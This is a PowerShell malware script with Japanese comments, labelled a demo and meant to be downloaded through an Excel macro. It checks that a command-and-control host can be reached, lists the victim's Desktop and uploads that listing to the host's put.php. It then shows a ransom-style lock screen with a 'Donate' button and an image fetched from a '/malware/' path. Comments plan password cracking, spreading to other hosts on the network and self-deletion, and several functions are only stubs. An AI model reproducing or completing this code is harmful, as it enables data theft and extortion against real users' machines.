## デモ用スクリプト
## 本スクリプト自体は C&C サーバ上に保存し、Excel マクロにてダウンロード
## されることを想定
##
## 残務
## C&C サーバとの疎通チェック
## パスワードクラッキング処理
##   → リストで対処 (リストはC&Cサーバから取得する)
##　　　2017年度脆弱パスワードランキングTOP100を利用＆pentest!
## 情報取得処理記述
## 　→ サブルーチン化
## 同一ネットワーク内のホストから情報取得
##　 → 上記サブルーチン流用のこと
## C&C サーバへ進捗報告
##  アタック中のホスト名
##  アタック中ホストの進捗率(実行コマンド数)
##  アタック完了ホストリスト
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.FileStream
Add-Type -AssemblyName System.IO.FileMode
Add-Type -AssemblyName System.Net.Http.StreamContent
Add-Type -AssemblyName System.Net.Http.Headers.MediaTypeHeaderValue
Add-Type -AssemblyName System.Net.Http..MultipartFormDataContent
 
$c2_host = 'www.google.com'
$c2_host = 'www.c-atkkfwh.com'
$c2_port = '80'
$c2_url= [string]::Join("",@("http://",$c2_host,":",$c2_port,"/"))
$c2_cmds = @{}
#$c2_cmds.Add("upload", [string]::Join("",@($c2_url,"upload")))
$c2_cmds.Add("upload", [string]::Join("",@($c2_url,"put.php")))
$c2_cmds.Add("progress", [string]::Join("",@($c2_url,"progress")))


## ターゲットホストのパスワードをクラックする
function Password-Crack($hostname, $domain)
{
    echo "Cracking your password....."
    return $TRUE
}

## ドメイン内のターゲット一覧取得
function Get-Target-Name($domain)
{
    echo "Search hosts in $domain."
}

## ターゲットホストの情報を取得する
function Get-Target-Info($hostname, $info)
{
    echo "Get Target($hostname) infos."
}
## C&C サーバへの接続性確認
function Check-C2Server()
{
    #echo "Check reachability to C&C server($c2_url)"
    try {
        $soc = New-Object System.Net.Sockets.tcpClient
        $soc.connect($c2_host, [int]$c2_port) # ポート番号はサーバプログラムに合わせる
        if ($?) {
            #echo 'Can reach to C&C server.'
            return $TRUE
        }
    }catch{
        #echo 'Cannot reach to C&C server.'
        return $FALSE
    }
}

## 取得した情報をC&Cサーバへアップロード
function Upload-Target-Info($filename)
{
    echo "Uploading Target($hostname) infos..."

    $FieldName = 'document'
    $ContentType = 'text/plain'

    $FileStream = [System.IO.FileStream]::new($filename, [System.IO.FileMode]::Open)
    $FileHead = [System.Net.Http.Headers.ContestDispositionHeaderValue]::new('form-data')
    $FileHeader.Name = $FieldName
    $FileHeader.FileName = Split-Path -leaf $filename
    $FileContent = [System.Net.Http.StreamContent]::new($FileStream)
    $FileContent.Headers.ContentDisposition = $FileHeader
    $FileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse($ContentType)

    $MultipartContent = [System.Net.Http.MultipartFormDataContent]::new()
    $MultipartContent.Add($FileContent)

    $Response = Invoke-WebRequest -Body $MultipartContent -Method 'POST' -Uri $c2_cmds.upload
}

## 情報抜き取りの進捗をC&Cサーバへ報告する
function Send-Progress($hostname, $info)
{
    echo "Connect C&C Server."
    return $TRUE
}

## 終了処理
## → 自身の削除、ファイルの削除、C&C サーバへ処理終了通知
function Clear-Self-Exec()
{
    echo "Finish to steal all informations on your networks."
}


## 完了画面表示
function lockScreen
{
    #デスクトップサイズ取得
    $dskHeight = gwmi win32_videocontroller | select -ExpandProperty CurrentVerticalResolution
    $dskWidth = gwmi win32_videocontroller | select -ExpandProperty CurrentHorizontalResolution
    #$formHeight = $dskHeight * 0.8
    #$formWidth = $dskWidth * 0.8
    $formHeight = 600
    $formWidth = 800
    #echo $formHeight
    #echo $formWidth
    
    #フォーム
    $form = New-Object System.Windows.Forms.Form 
    $form.Text = "イメージテスト"
    #$form.Size = New-Object System.Drawing.Size($formWidth,$formHeight) 
    $form.StartPosition = "CenterScreen"
    $form.AutoSize = $True
    $form.FormBorderStyle = "None"
    #$form.WindowState = "Maximized"
    $form.AutoSizeMode = "GrowAndShrink"
    $form.BackColor = "#FFFFFFFF"
    
    #寄付ボタン
    # ボタンを押すと終了
    $buttonPy = $formHeight - 65
    $buttonPx = $formWidth - 185
    $donateButton = New-Object System.Windows.Forms.Button
    $donateButton.Location = New-Object System.Drawing.Point($buttonPx,$buttonPy)
    $donateButton.Size = New-Object System.Drawing.Size(150,50)
    $donateButton.Text = 'Next (Donate)'
    $donateButton.ForeColor= "White"
    $donateButton.BackColor= "Blue"
    $donateButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
    $form.AcceptButton = $donateButton
    $form.Controls.Add($donateButton)
    
     
    #PictureBox
    #画像データの取得
    $webReq = [System.Net.HttpWebRequest]::Create("http://10.10.10.251/malware/PC_Locked_JP.jpg")
    $webReq.Method = "GET"
    $webReq.UserAgent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322)"
    $webResp = $webReq.GetResponse()
    $ms = New-Object System.IO.MemoryStream($bytes)
    $pic = New-Object System.Windows.Forms.PictureBox
    $pic.Size = New-Object System.Drawing.Size($formWidth,$formHeight)
    $pic.Image = [System.Drawing.Image]::FromStream($webResp.getResponseStream())
    $pic.Location = New-Object System.Drawing.Point(0,0) 
    $pic.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::Zoom
    $form.Controls.Add($pic) 
     
    #フォームを表示
    $result = $form.ShowDialog()
    $form.WindowState = "Normal"
    $form.FormBorderStyle = "None"
    $form.WindowState = "Maximized"
     
    #リソースを開放
    $pic.Image.Dispose()
    $pic.Image = $null
}


## C&C サーバへの接続確認
echo "Check reachability to C&C server($c2_url)"
$result = Check-C2Server
if ( -not $result ) {
    [void][System.WIndows.Forms.MessageBox]::Show("C&C サーバに接続できませんでした")
    Exit
}

## 自ホストの情報を取得する
$desktop = [string]::Join("", @($env:HOMEPATH,"\Desktop"))
$hostname = $env:COMPUTERNAME

## dir
$filename = [string]::Join("", @($desktop, "\", $hostname,"-dir.txt"))
dir $desktop > $filename
Upload-Target-Info $filename


## systeminfo
#$filename = [string]::Join("", @($desktop, "\", $hostname,"-systeminfo.txt"))
#systeminfo > $filename

## netstat
#$filename = [string]::Join("", @($desktop, "\", $hostname,"-netstat.txt"))
#netstat -an > $filename

## タスクスケジューラに自身のタスクが登録されている場合は削除


## ターゲットホストから情報抜き取り

## 終了処理
Clear-Self-Exec
